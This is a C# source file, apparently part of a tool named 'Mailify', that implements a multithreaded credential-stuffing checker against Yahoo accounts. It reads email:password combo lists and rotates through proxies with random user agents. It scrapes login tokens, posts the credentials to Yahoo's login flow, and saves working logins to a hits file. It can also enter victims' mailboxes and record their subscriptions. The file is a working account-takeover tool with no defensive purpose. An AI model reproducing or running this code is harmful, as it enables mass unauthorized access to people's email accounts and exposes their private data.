using Leaf.xNet;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Threading;
using static Mailify.ConsoleUtilities;
using System.Drawing;
using Console = Colorful.Console;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using System.Diagnostics;
using Newtonsoft.Json;
using System.Text.RegularExpressions;

namespace Mailify
{
    internal class Yahoo_1
    {
        public static int proxyTimeout { get; set; } = 7000;
        public static ProxyType proxyType { get; set; } = ProxyType.HTTP;

        public static readonly object objsafe = new object();

        public static void Initialize(int maxThreads, int _proxyTimeout, ProxyType _proxyType)
        {
            proxyTimeout = _proxyTimeout;
            proxyType = _proxyType;

            new Thread(() => Variables.Mail_Mode_Title()).Start();

            ThreadPool.SetMinThreads(maxThreads, maxThreads);
            Thread[] threads1 = new Thread[maxThreads];
            for (int i = 0; i < maxThreads; i++)
            {
                threads1[i] = new Thread(() =>
                {
                    while (!Variables.combos.IsEmpty)
                    {
                        Variables.combos.TryDequeue(out string data);
                        Worker(data);
                    }
                });
                threads1[i].Start();
            }
            for (int i = 0; i < maxThreads; i++) threads1[i].Join();

            Thread.Sleep(-1);


        }
        public static Random Rnd = new Random(Environment.TickCount);
        static void Worker(string combo)
        {
            try
            {
                Variables.proxyIndex = Variables.proxyIndex >= Variables.proxies.Length ? 0 : Variables.proxyIndex;
                var proxy = Variables.proxies[Variables.proxyIndex];
                var credentials = combo.Split(new char[] { ':', ';', '|' }, StringSplitOptions.RemoveEmptyEntries);
                using (var request = new HttpRequest()
                {
                    KeepAlive = true,
                    IgnoreProtocolErrors = true,
                    Proxy = ProxyClient.Parse(proxyType, proxy)
                })
                {
                    request.Proxy.ConnectTimeout = proxyTimeout;
                    request.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(request.SslCertificateValidatorCallback,
                    new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));

                    string RANUA = Http.RandomUserAgent();
                    var USERR = WebUtility.UrlEncode("" + credentials[0]);
                    var PASSS = WebUtility.UrlEncode("" + credentials[1]);
                    request.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
                    request.AddHeader("Accept-Encoding", "gzip, deflate, br");
                    request.AddHeader("Accept-Language", "en-US,en;q=0.9,fa;q=0.8");
                    request.AddHeader("Cache-Control", "max-age=0");
                    request.AddHeader("Connection", "keep-alive");
                    request.AddHeader("Referer", "https://www.google.com/");
                    request.AddHeader("Sec-Fetch-Dest", "document");
                    request.AddHeader("Sec-Fetch-Mode", "navigate");
                    request.AddHeader("Sec-Fetch-Site", "cross-site");
                    request.AddHeader("Sec-Fetch-User", "?1");
                    request.AddHeader("Upgrade-Insecure-Requests", "1");
                    request.AddHeader("User-Agent", "" + RANUA + "");

                    var res0 = request.Get("https://login.yahoo.com/");
                    string text0 = res0.ToString();

                    var acrumb = Functions.LR(text0, "\"acrumb\" value=\"", "\"").FirstOrDefault();
                    var sessionIndex = Functions.LR(text0, "sessionIndex\" value=\"", "\"").FirstOrDefault();
                    request.AddHeader("Accept", "*/*");
                    request.AddHeader("Accept-Encoding", "gzip, deflate, br");
                    request.AddHeader("Accept-Language", "en-US,en;q=0.9,fa;q=0.8");
                    request.AddHeader("bucket", "mbr-phoenix-gpst");
                    request.AddHeader("Connection", "keep-alive");
                    request.AddHeader("Origin", "https://login.yahoo.com");
                    request.AddHeader("Referer", "https://login.yahoo.com/");
                    request.AddHeader("Sec-Fetch-Dest", "empty");
                    request.AddHeader("Sec-Fetch-Mode", "cors");
                    request.AddHeader("Sec-Fetch-Site", "same-origin");
                    request.AddHeader("User-Agent", "" + RANUA + "");
                    request.AddHeader("X-Requested-With", "XMLHttpRequest");

                    var res1 = request.Post("https://login.yahoo.com/", "acrumb=" + acrumb + "&sessionIndex=" + sessionIndex + "&username=" + USERR + "&passwd=&signin=Next", "application/x-www-form-urlencoded; charset=UTF-8");
                    string text1 = res1.ToString();

                    var URL = Functions.LR(text1, "{\"location\":\"", "\"}").FirstOrDefault();


                    if (!text1.Contains("{\"error\":\"messages.ERROR_INVALID_USERNAME"))
                    {
                        request.AllowAutoRedirect = false;
                        request.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
                        request.AddHeader("Accept-Encoding", "gzip, deflate, br");
                        request.AddHeader("Accept-Language", "en-US,en;q=0.9,fa;q=0.8");
                        request.AddHeader("Cache-Control", "max-age=0");
                        request.AddHeader("Connection", "keep-alive");
                        request.AddHeader("Origin", "https://login.yahoo.com");
                        request.AddHeader("Referer", "https://login.yahoo.com/");
                        request.AddHeader("Sec-Fetch-Dest", "document");
                        request.AddHeader("Sec-Fetch-Mode", "navigate");
                        request.AddHeader("Sec-Fetch-Site", "same-origin");
                        request.AddHeader("Sec-Fetch-User", "?1");
                        request.AddHeader("Upgrade-Insecure-Requests", "1");
                        request.AddHeader("User-Agent", "" + RANUA + "");

                        var res2 = request.Post("https://login.yahoo.com" + URL + "", "crumb=czI9ivjtMSr&acrumb=" + acrumb + "&sessionIndex=QQ--&displayName=" + USERR + "&passwordContext=normal&password=" + PASSS + "&verifyPassword=Next", "application/x-www-form-urlencoded");
                        string text2 = res2.ToString();


                        if (text2.Contains("https://guce.yahoo.com/consent?gcrumb="))
                        {
                            if (Convert.ToBoolean(Config.Capture_Subscriptions) == true)
                            {
                                request.ClearAllHeaders();
                                request.AllowAutoRedirect = false;
                                request.AddHeader("user-agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/87.0.4280.77 Mobile/18C66 Safari/604.1");
                                request.AddHeader("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                                request.AddHeader("accept-language", "ach,en-GB;q=0.8,en-US;q=0.5,en;q=0.3");
                                request.AddHeader("accept-encoding", "br, gzip, deflate");
                                request.AddHeader("dnt", "1");
                                request.AddHeader("upgrade-insecure-requests", "1");
                                string pre = request.Get("https://mail.yahoo.com/m/?.src=ym&reason=mobile").ToString();

                                var MBOXID = Functions.LR(pre, "\"selectedMailbox\":{\"id\":\"", "\"").FirstOrDefault();
                                var WSSID = Functions.LR(pre, "\"mailWssid\":\"", "\"").FirstOrDefault();
                                var APPID = Functions.LR(pre, "\"appId\":\"", "\"").FirstOrDefault();
                                var YMREQID = Guid.NewGuid().ToString();
                                var EMAIL = WebUtility.UrlEncode(credentials[0]);

                                request.ClearAllHeaders();
                                request.AllowAutoRedirect = false;
                                request.AddHeader("user-agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/87.0.4280.77 Mobile/18C66 Safari/604.1");
                                request.AddHeader("accept", "application/json");
                                request.AddHeader("accept-language", "ach,en-GB;q=0.8,en-US;q=0.5,en;q=0.3");
                                request.AddHeader("accept-encoding", "gzip, deflate, br");
                                request.AddHeader("referer", "https://mail.yahoo.com/");
                                request.AddHeader("origin", "https://mail.yahoo.com");
                                request.AddHeader("dnt", "1");
                                string capture_subs = request.Get($"https://data.mail.yahoo.com/f/subscription/email/brand?acctid=1&mboxid={MBOXID}&wssid={WSSID}&appid={APPID}&ymreqid={YMREQID}&email={EMAIL}&sort=score.desc").ToString();

                                var subcount = Functions.JSON(capture_subs, "count").FirstOrDefault();
                                var subs = string.Join(Environment.NewLine, Functions.LR(capture_subs, "\"name\":\"", "\",\"score\":", true));


                                Variables.Valid++;
                                Variables.Checked++;
                                Variables.cps++;
                                lock (Variables.WriteLock)
                                {
                                    Variables.remove(combo);
                                    if (Config.kekr_UI == "LOG")
                                    {
                                        Console.WriteLine($"[+] {combo}", Color.Green);
                                    }
                                    File.AppendAllText(Variables.results + "Hits.txt", combo + Environment.NewLine);
                                    File.AppendAllText(Variables.subcaps + $"[Sub Captured].txt", "------------------------------------------" + Environment.NewLine + combo + Environment.NewLine + "====================SUBS==================" + Environment.NewLine + subs + Environment.NewLine + Environment.NewLine);
                                }
                            }
                            else
                            {
                                Variables.Valid++;
                                Variables.Checked++;
                                Variables.cps++;
                                lock (Variables.WriteLock)
                                {
                                    Variables.remove(combo);
                                    if (Config.kekr_UI == "LOG")
                                    {
                                        Console.WriteLine($"[+] {combo}", Color.Green);
                                    }
                                    File.AppendAllText(Variables.results + "Hits.txt", combo + Environment.NewLine);
                                }
                            }
                        }
                        else if (text2.Contains("/account/challenge/password?") || text2.Contains("Get Account Key code") || text2.Contains("recognize"))
                        {
                            Variables.Invalid++;
                            Variables.Checked++;
                            Variables.cps++;
                            lock (Variables.WriteLock)
                            {
                                Variables.remove(combo);
                            }
                        }
                        else if (text2.Contains("account/challenge/fail?src") || text2.Contains("Not Found") || text2.Contains("account/challenge/phone-obfuscation") || text2.Contains(">Open any Yahoo app<"))
                        {
                            Variables.Custom++;
                            Variables.Checked++;
                            Variables.cps++;
                            lock (Variables.WriteLock)
                            {
                                Variables.remove(combo);
                                File.AppendAllText(Variables.results + "Customs.txt", combo + Environment.NewLine);
                            }
                        }
                        else
                        {
                            Variables.combos.Enqueue(combo);
                            Variables.proxyIndex++;
                            Variables.Errors++;
                        }
                    }
                    else if (text1.Contains("{\"error\":\"messages.ERROR_INVALID_USERNAME") || text1.Contains("account/challenge/push?src=noSrc") || text1.Contains("Sorry, we don't recognize this email"))
                    {
                        Variables.Invalid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                        }
                    }
                    else if (text1.Contains("recaptcha"))
                    {
                        Variables.combos.Enqueue(combo);
                        Variables.proxyIndex++;
                        Variables.Errors++;
                    }
                    else if (text1.Contains("account/challenge/phone-obfuscation") || text1.Contains(">Open any Yahoo app<"))
                    {

                        Variables.Custom++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                            File.AppendAllText(Variables.results + "Customs.txt", combo + Environment.NewLine);
                        }
                    }
                }
            }
            catch
            {
                Variables.combos.Enqueue(combo);
                Variables.proxyIndex++;
                Variables.Errors++;
            }
        }
    }
}